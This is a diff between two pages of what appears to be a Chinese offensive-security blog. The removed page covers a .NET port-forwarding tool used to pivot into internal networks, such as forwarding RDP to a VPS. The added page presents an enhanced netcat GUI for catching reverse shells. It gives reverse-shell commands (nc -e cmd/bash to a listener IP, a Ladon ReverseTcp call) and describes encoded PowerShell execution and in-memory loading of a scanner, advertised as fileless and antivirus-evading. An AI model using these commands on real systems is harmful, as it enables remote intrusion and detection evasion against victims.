@@ -19,13 +19,10 @@
     <link rel="dns-prefetch" href="http://k8gege.org">
     <!--SEO-->
 
-<meta name="keywords" content="Tool,PortTran">
+<meta name="keywords" content="netcat">
 
 
-<meta name="description" content="0x001 简介
-PortTran by k8gege.NET版端口转发工具，支持任意权限下转发 
-0x002 背景工具在2016年左右写的，当时某个内网不知何原故LCX用不了
-由于Win200...">
+<meta name="description" content="NC简介NetCat，简称Nc，是一款非常实用的网络工具，他它能够建立并接受传输控制协议（TCP)和用户数据报协议(UDP)的连接，小巧而功能强大，被誉为网络安全界的“瑞士军刀”。NetCat被...">
 
 
 <meta name="robots" content="all">
@@ -36,7 +33,7 @@ PortTran by k8gege.NET版端口转发工具，支持任意权限下转发
 
 <title>
     
-    .NET端口转发工具PortTran |
+    〖工具〗加强版NC加密执行PowerShell/内存加载Ladon扫描 |
     
     K8哥哥’s Blog
 </title>
@@ -156,16 +153,16 @@ PortTran by k8gege.NET版端口转发工具，支持任意权限下转发
                     <p id="process"></p>
 <article class="post">
     <div class="post-head">
-        <h1 id=".NET端口转发工具PortTran">
+        <h1 id="〖工具〗加强版NC加密执行PowerShell/内存加载Ladon扫描">
             
-            .NET端口转发工具PortTran
+            〖工具〗加强版NC加密执行PowerShell/内存加载Ladon扫描
             
         </h1>
         <div class="post-meta">
     
     <span class="categories-meta fa-wrap">
         <i class="fa fa-folder-open-o"></i>
-        <a class="category-link" href="/categories/Dotnet/">.NET</a> <a class="category-link" href="/categories/Tool/">工具</a>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a>
     </span>
     
     
@@ -173,7 +170,7 @@ PortTran by k8gege.NET版端口转发工具，支持任意权限下转发
         <i class="fa fa-tags"></i>
         <span class="tags-meta">
             
-            <a class="tag-link" href="/tags/PortTran/" rel="tag">PortTran</a> <a class="tag-link" href="/tags/Tool/" rel="tag">Tool</a>
+            <a class="tag-link" href="/tags/netcat/" rel="tag">netcat</a>
             
         </span>
     </span>
@@ -183,7 +180,7 @@ PortTran by k8gege.NET版端口转发工具，支持任意权限下转发
     <span class="fa-wrap">
         <i class="fa fa-clock-o"></i>
         <span class="date-meta">
-            2019/12/03</span>
+            2020/12/25</span>
     </span>
     
     <span class="fa-wrap">
@@ -195,43 +192,28 @@ PortTran by k8gege.NET版端口转发工具，支持任意权限下转发
 </div>
         
         
-        <p class="fa fa-exclamation-triangle warning">
-            本文于<strong>
-                389</strong>
-            天之前发表
-        </p>
-        
     </div>
     
     <div class="post-body post-content">
-        <p><span style="font-size: 18px;"><strong>0x001 简介</strong></span></p>
-<p>PortTran by k8gege<br>.NET版端口转发工具，支持任意权限下转发 </p>
-<p><span style="font-size: 18px;"><strong>0x002 背景</strong></span><br>工具在2016年左右写的，当时某个内网不知何原故LCX用不了</p>
-<p>由于Win2003才刚停更不久，依然有不少内网还是03的机器</p>
-<p>加上.NET版的兼容性均没LCX好，所以我自己也很少用...</p>
-<p>以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统</p>
-<p>.net程序不用慌了，体积小和易于免杀大家都开心了。</p>
-<p><span style="font-size: 18px;"><strong>0x003 用法</strong></span></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">0x001 VPS监听
-PortTranS.exe 8000 338
-
-<p>0x002 目标内网转发<br>PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000</p>
-<p>0x003 VPS连接3389<br>mstsc /console /v:127.0.0.1:338<br></p></pre><p></p>
+        <h3 id="NC简介"><a href="#NC简介" class="headerlink" title="NC简介"></a>NC简介</h3><p>NetCat，简称Nc，是一款非常实用的网络工具，他它能够建立并接受传输控制协议（TCP)和用户数据报协议(UDP)的连接，小巧而功能强大，被誉为网络安全界的“瑞士军刀”。NetCat被设计成一个可靠的后端(back-end) 工具，拥有功能丰富的网络调试和开发工具，它可以通过手工或者脚本与应用层的网络应用程序或服务进行交互，可以帮你轻易的建立几乎任何类型的连接。同时还可以当服务器使用，能监听任意指定端口的连接请求(inbound connection )，并可做同样的读写操作。</p>
+<p>netcat在UNIX/LINUX/MAC等系统默认安装，所以现在依然是黑客必学的命令，功能很多，但现在大多数人估计也就只会用它来反弹。上一代或喜欢命令行下渗透的，可能比较熟悉使用NC的其它功能，什么端口扫描、监听、抓包等，由于现在我最多也就使用它来反弹，所以就弄个加强版的NC客户端，可监听来自WINDOWS、Linux、Mac等任意系统反弹的SHELL，针对Windows还可执行PowerShell命令、当然也支持渗透必备的Ladon。</p>
+<h3 id="加强版NC"><a href="#加强版NC" class="headerlink" title="加强版NC"></a>加强版NC</h3><p>GUI 2020.12.25<br>[+] Netcat PowerShell命令加密执行<br>[+] Netcat 内存加载PowerLadon执行</p>
+<p>GUI 2020.12.16<br>[u] Netcat 兼容Linux或MAC反弹SHELL<br>[+] Netcat 执行命令历史记录</p>
+<h3 id="NC监听"><a href="#NC监听" class="headerlink" title="NC监听"></a>NC监听</h3><p>nc -lvp 4444</p>
+<p>LadonGUI监听，直接点击Listen即可</p>
+<h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>nc -e cmd 192.168.1.110 4444</p>
+<h4 id="linux-mac"><a href="#linux-mac" class="headerlink" title="linux/mac"></a>linux/mac</h4><p>nc -e /bin/bash 192.168.1.110 4444</p>
+<h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><p>Ladon ReverseTcp 192.168.1.110 4444 nc</p>
+<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>其它方法反弹，Ladon也支持</p>
+<h3 id="执行CMD命令"><a href="#执行CMD命令" class="headerlink" title="执行CMD命令"></a>执行CMD命令</h3><p>不勾选PowerShell或PowerLadon，默认即是正常的CMD命令</p>
+<h3 id="执行PowerShell命令-加密"><a href="#执行PowerShell命令-加密" class="headerlink" title="执行PowerShell命令(加密)"></a>执行PowerShell命令(加密)</h3><p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/ncpowershell.PNG"></p>
+<h3 id="一键搭建WEB服务器"><a href="#一键搭建WEB服务器" class="headerlink" title="一键搭建WEB服务器"></a>一键搭建WEB服务器</h3><p>将Ladon.ps1和Ladon.exe放到VPS或内网中，使用Ladon web 800搭建Web服务器<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/Ladon_web.PNG"></p>
+<h3 id="远程内存加载Ladon扫描"><a href="#远程内存加载Ladon扫描" class="headerlink" title="远程内存加载Ladon扫描"></a>远程内存加载Ladon扫描</h3><p>优点：1.无文件落地 2.免杀 3.无操作痕迹<br>执行NC反弹后，填写对应Ladon.ps1的下载地址并勾选PowerLadon，然后就可以像使用EXE或CS版那样使用Ladon了<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/NC_PowerLadon.PNG"></p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.7版本：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
 </div>
-<p><span style="font-size: 18px;"><strong>&nbsp;0x004 实例 </strong></span></p>
-<p>1.vps监听</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran1.png"></p>
-<p>2.目标内网3389端口转发</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran2.png"></p>
-<p>3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran3.png"></p>
-<p>不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口</p>
-<p>就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来</p>
-<p>再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x005 下载</strong></span></p>
-<p><a href="https://github.com/k8gege/K8tools/raw/master/PortTran.rar" target="_blank">https://github.com/k8gege/PortTran</a></p>
-<p>&nbsp;</p>
+
     </div>
     
     <div class="reward" ontouchstart>
@@ -259,17 +241,11 @@ PortTranS.exe 8000 338
 </article>
 <div class="article-nav prev-next-wrap clearfix">
     
-    <a href="/p/dcb670e3.html" class="pre-post btn btn-default" title="Ladon Scanner For Python">
-        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
-        <span class="hidden-xs">
-            Ladon Scanner For Python</span>
-    </a>
     
-    
-    <a href="/p/f3512dbc.html" class="next-post btn btn-default" title="Python免杀ShellCode加载器(Cobalt Strike/Metasploit)">
+    <a href="/p/k8ms17010exp.html" class="next-post btn btn-default" title="〖EXP〗NSA MS17010永恒之蓝漏洞一键工具">
         <span class="hidden-lg">下一篇</span>
         <span class="hidden-xs">
-            Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</span><i class="fa fa-angle-right fa-fw"></i>
+            〖EXP〗NSA MS17010永恒之蓝漏洞一键工具</span><i class="fa fa-angle-right fa-fw"></i>
     </a>
     
 </div>
@@ -305,7 +281,7 @@ gitalk.render('gitalk-container');
             Table of Contents
         </h3>
         
-        <p>not dir</p>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#NC简介"><span class="toc-text">NC简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#加强版NC"><span class="toc-text">加强版NC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC监听"><span class="toc-text">NC监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc反弹"><span class="toc-text">nc反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux-mac"><span class="toc-text">linux&#x2F;mac</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon"><span class="toc-text">Ladon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其它"><span class="toc-text">其它</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#执行CMD命令"><span class="toc-text">执行CMD命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#执行PowerShell命令-加密"><span class="toc-text">执行PowerShell命令(加密)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一键搭建WEB服务器"><span class="toc-text">一键搭建WEB服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程内存加载Ladon扫描"><span class="toc-text">远程内存加载Ladon扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon下载"><span class="toc-text">Ladon下载</span></a></li></ol>
         
     </div>
 </aside>
